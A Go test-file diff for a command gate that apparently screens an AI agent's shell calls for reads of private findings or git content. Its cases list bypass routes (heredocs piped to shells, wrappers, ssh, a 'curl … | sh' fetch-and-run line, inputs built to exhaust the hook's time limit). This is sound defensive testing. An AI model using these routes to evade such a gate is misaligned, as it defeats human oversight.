@@ -2,9 +2,11 @@ package gate_test
 
 import (
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/craigalodon/pbipx/internal/gate"
 )
@@ -371,4 +373,194 @@ func TestShellControlFiles(t *testing.T) {
 		{"another file in the Claude directory", sh("cat ~/.claude/keybindings.json"), ""},
 		{"cp a command into the Claude directory", sh("cp x.md ~/.claude/commands/"), ""},
 	})
+}
+
+func TestShellHeredocs(t *testing.T) {
+	runBoth(t, []both{
+		{"an apostrophe in a body, then a search",
+			sh("cat > notes/x.md <<'EOF'\nIt's done\nEOF\ngrep -rn Jane"), "", gate.ReasonFinding},
+		{"an unquoted body, then a search",
+			sh("cat > notes/x.md <<EOF\nIt's done\nEOF\nrg Jane"), "", gate.ReasonFinding},
+		{"<<- with tabs, then a search",
+			sh("cat <<-EOF > notes/x.md\n\tIt's done\n\tEOF\nrg Jane"), "", gate.ReasonFinding},
+		{"a script written from a body is data",
+			sh("cat > scripts/check.sh <<'EOF'\ngit diff --exit-code\nrg Jane\nEOF"), "", ""},
+		{"a commit message from a body",
+			sh("git commit -m \"$(cat <<'EOF'\nFix the git show handling\nIt's done\nEOF\n)\""), "", ""},
+		{"a substitution in an unquoted body runs",
+			shIn("sql", "cat > x <<EOF\n$(git diff)\nEOF"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a backtick in an unquoted body runs",
+			shIn("sql", "cat > x <<EOF\n`cd .. && rg x`\nEOF"), "", gate.ReasonFinding},
+		{"a substitution in a quoted body does not",
+			shIn("sql", "cat > x <<'EOF'\n$(git diff)\nEOF"), "", ""},
+		{"a body fed to bash",
+			shIn("sql", "bash <<'EOF'\ncd ..\nrg Jane\nEOF"), "", gate.ReasonFinding},
+		{"a body fed to sh -s",
+			shIn("sql", "sh -s <<'EOF'\ngit log -p\nEOF"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a body piped to a shell",
+			shIn("sql", "cat <<'EOF' | bash\ngit diff\nEOF"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a here-string fed to bash", shIn("sql", "bash <<< 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"echo piped to a shell", shIn("sql", "echo 'git diff' | sh"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"something else piped to a shell", shIn("sql", "curl -s example.invalid | sh"), "", gate.ReasonFinding},
+		{"source /dev/stdin", shIn("sql", "source /dev/stdin <<'EOF'\ngit diff\nEOF"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a body with no delimiter line is data to the end",
+			shIn("sql", "cat > x <<'EOF'\nrg Jane .."), "", ""},
+		{"unbalanced quotes still split at newlines",
+			sh("echo 'open\ngrep -rn Jane"), "", gate.ReasonFinding},
+		{"a reader in a line that does not tokenize",
+			shIn("sql", "echo 'open; cat clean.sql"), "", gate.ReasonFinding},
+		{"a non-reader in a line that does not tokenize",
+			shIn("sql", "echo 'open; ls"), "", ""},
+	})
+}
+
+func TestShellTreeChangeThenRead(t *testing.T) {
+	runBoth(t, []both{
+		{"switch then search", sh("git switch old-feature && rg -n Jane"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"checkout of paths then cat", shIn("sql", "git checkout HEAD~2 -- . && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"restore then cat", shIn("sql", "git restore --source=HEAD~1 -- . && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"stash pop then search", shIn("sql", "git stash pop && rg x"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"stash then read", shIn("sql", "git stash; head clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"reset --hard then read", shIn("sql", "git reset --hard HEAD~3; wc -l clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"merge then read", shIn("sql", "git merge topic && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"pull then read", shIn("sql", "git pull && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"cherry-pick then read", shIn("sql", "git cherry-pick abc && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"revert then read", shIn("sql", "git revert abc && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"am then read", shIn("sql", "git am p.mbox && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"apply then read", shIn("sql", "git apply p.diff && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"worktree add then search", shIn("sql", "git worktree add /tmp/w old && grep -r x /tmp/w"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"clone then cat", shIn("sql", "git clone . /tmp/c && cat /tmp/c/x"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"bundle unbundle then read", shIn("sql", "git bundle unbundle b && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"tar -x then read", shIn("sql", "tar -xf a.tar && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"tar xzf then read", shIn("sql", "tar xzf a.tgz; cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"unzip then read", shIn("sql", "unzip a.zip && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a script after the change", shIn("sql", "git checkout old && ./build.sh"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"a read nested after the change", shIn("sql", "git checkout old && bash -c 'cat clean.sql'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"an alias", shIn("sql", "git co old && cat clean.sql"), gate.ReasonGitContent, gate.ReasonGitContent},
+
+		{"the change alone", shIn("sql", "git switch old-feature"), "", ""},
+		{"a read before the change", shIn("sql", "cat clean.sql && git switch old"), "", ""},
+		{"git after the change", shIn("sql", "git checkout main && git pull --rebase origin main && git log --oneline"), "", ""},
+		{"echo after the change", shIn("sql", "git switch main && echo done"), "", ""},
+		{"stash list then read", shIn("sql", "git stash list && cat clean.sql"), "", ""},
+		{"reset of the index then read", shIn("sql", "git reset HEAD~1 && cat clean.sql"), "", ""},
+		{"restore --staged then read", shIn("sql", "git restore --staged x && cat clean.sql"), "", ""},
+		{"apply --check then read", shIn("sql", "git apply --check p.diff && cat clean.sql"), "", ""},
+		{"tar -c then read", shIn("sql", "tar -cf /tmp/a.tar . && cat clean.sql"), "", ""},
+	})
+}
+
+func TestShellFdAndSearchers(t *testing.T) {
+	runBoth(t, []both{
+		{"fd -x", sh("fd -e json -x cat"), "", gate.ReasonFinding},
+		{"fd --exec-batch", sh("fd . --exec-batch wc -l"), "", gate.ReasonFinding},
+		{"fd -X under notes", sh("fd -X cat ';' md notes"), "", ""},
+		{"fd -x under a root", shIn("sql", "fd json ../pbip -x cat"), "", gate.ReasonFinding},
+		{"fd with a search path", shIn("sql", "fd --search-path ../pbip -x cat"), "", gate.ReasonFinding},
+		{"fd -x running git", shIn("sql", "fd -x git diff"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"fd lists names", sh("fd json"), "", ""},
+		{"fd piped to xargs", sh("fd json | xargs cat"), "", gate.ReasonFinding},
+		{"fdfind -x", sh("fdfind -x cat"), "", gate.ReasonFinding},
+		{"ugrep", sh("ugrep -n Jane"), "", gate.ReasonFinding},
+		{"ug", sh("ug Jane"), "", gate.ReasonFinding},
+		{"rga", sh("rga Jane"), "", gate.ReasonFinding},
+		{"sift", sh("sift Jane"), "", gate.ReasonFinding},
+		{"pt", sh("pt Jane"), "", gate.ReasonFinding},
+		{"ugrep away", shIn("sql", "ugrep -n Jane"), "", ""},
+	})
+}
+
+func TestShellWrappersAndRemote(t *testing.T) {
+	runBoth(t, []both{
+		{"unbuffer", sh("unbuffer rg Jane"), "", gate.ReasonFinding},
+		{"taskset", sh("taskset -c 1 rg Jane"), "", gate.ReasonFinding},
+		{"flock", sh("flock /tmp/l rg Jane"), "", gate.ReasonFinding},
+		{"flock -c", shIn("sql", "flock /tmp/l -c 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"coproc", sh("coproc rg Jane"), "", gate.ReasonFinding},
+		{"watch", shIn("sql", "watch -n 5 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"env -S", shIn("sql", "env -S 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"parallel :::", shIn("sql", "parallel ::: 'git diff' ls"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"parallel template", shIn("sql", "parallel cat ::: ../pbip/B.Report/"+leakInReport), "", gate.ReasonFinding},
+		{"chronic", sh("chronic rg Jane"), "", gate.ReasonFinding},
+		{"ionice", sh("ionice -c 3 rg Jane"), "", gate.ReasonFinding},
+		{"nice -n", sh("nice -n 10 rg Jane"), "", gate.ReasonFinding},
+		{"stdbuf", sh("stdbuf -oL rg Jane"), "", gate.ReasonFinding},
+		{"setsid", sh("setsid rg Jane"), "", gate.ReasonFinding},
+		{"caffeinate", sh("caffeinate -i rg Jane"), "", gate.ReasonFinding},
+		{"xvfb-run", sh("xvfb-run -a rg Jane"), "", gate.ReasonFinding},
+		{"timeout with a long option", sh("timeout --signal KILL 5 rg Jane"), "", gate.ReasonFinding},
+		{"an unknown wrapper", sh("mywrap -q rg Jane"), "", gate.ReasonFinding},
+		{"bash -c --", shIn("sql", "bash -c -- 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"bash --rcfile", shIn("sql", "bash --rcfile /dev/null -c 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"busybox sh -c", shIn("sql", "busybox sh -c 'git diff'"), gate.ReasonGitContent, gate.ReasonGitContent},
+		{"pwsh -c", shIn("sql", "pwsh -c 'Get-Content x'"), "", gate.ReasonFinding},
+		{"powershell -Command", shIn("sql", "powershell -Command 'gc x'"), "", gate.ReasonFinding},
+		{"su -c", shIn("sql", "su -c 'cat x' nobody"), "", gate.ReasonFinding},
+		{"ssh with a command", shIn("sql", "ssh localhost 'cat x'"), "", gate.ReasonFinding},
+
+		{"pwsh version", shIn("sql", "pwsh --version"), "", ""},
+		{"ssh alone", shIn("sql", "ssh -p 22 localhost"), "", ""},
+		{"which", sh("which rg"), "", ""},
+		{"command -v", sh("command -v rg"), "", ""},
+		{"echo git diff", shIn("sql", "echo git diff"), "", ""},
+		{"man", sh("man grep"), "", ""},
+	})
+}
+
+func TestShellMessageNamesOnlyGitSubcommands(t *testing.T) {
+	root := newRepo(t, cleanFiles())
+	// An alias whose name could be a value; a shell alias is denied.
+	cmd := exec.Command("git", "config", "alias.Doe-Jane-alias", "!cat x")
+	cmd.Dir = root
+	if err := cmd.Run(); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct{ cmd, want string }{
+		{"git diff", "git diff "},
+		{"git Doe-Jane-alias", "git prints"},
+	} {
+		d := gate.Decide(shIn(root, tc.cmd), gate.Options{})
+		check(t, d, gate.ReasonGitContent)
+		if strings.Contains(d.Message, "Doe") || !strings.Contains(d.Message, tc.want) {
+			t.Errorf("%s: message %q", tc.cmd, d.Message)
+		}
+	}
+	d := gate.Decide(shIn(root, "git Doe-Jane-alias old && cat x"), gate.Options{})
+	if strings.Contains(d.Message, "Doe") {
+		t.Errorf("the message names the subcommand: %q", d.Message)
+	}
+}
+
+// TestShellBounded checks that adversarial command lines decide quickly:
+// the hook's own time limit lets a call through.
+func TestShellBounded(t *testing.T) {
+	root := newRepo(t, leakyFiles())
+	for name, cmd := range map[string]string{
+		"many words":           "cat " + strings.Repeat("a ", 512<<10),
+		"many commands":        strings.Repeat("ls x;", 200<<10),
+		"one long word":        "cat " + strings.Repeat("a", 1<<20),
+		"nested substitutions": strings.Repeat("$(", 300<<10) + strings.Repeat(")", 200<<10),
+		"many heredocs":        strings.Repeat("cat <<E\nx\nE\n", 80<<10),
+		"many globs":           strings.Repeat("ls */*/* ", 100<<10),
+		"deep **":              "cat " + strings.Repeat("**/", 2000) + "x",
+		"many **":              "cat " + strings.Repeat("**/*/", 30) + "x " + strings.Repeat("pbip/**/*/**/x ", 1000),
+		"unbalanced":           "'" + strings.Repeat("cat x; ", 140<<10),
+	} {
+		t.Run(name, func(t *testing.T) {
+			if len(cmd) > 1<<20+16 {
+				cmd = cmd[:1<<20]
+			}
+			start := time.Now()
+			d := gate.Decide(shIn(root, cmd), gate.Options{})
+			if el := time.Since(start); el > slowdown*2*time.Second {
+				t.Errorf("took %v", el)
+			}
+			if name == "many commands" {
+				check(t, d, gate.ReasonInternalError)
+			}
+		})
+	}
+	// Up to the limit, every command is judged.
+	ok := strings.Repeat("ls notes;", 19000) + "git diff"
+	check(t, gate.Decide(shIn(root, ok), gate.Options{}), gate.ReasonGitContent)
 }
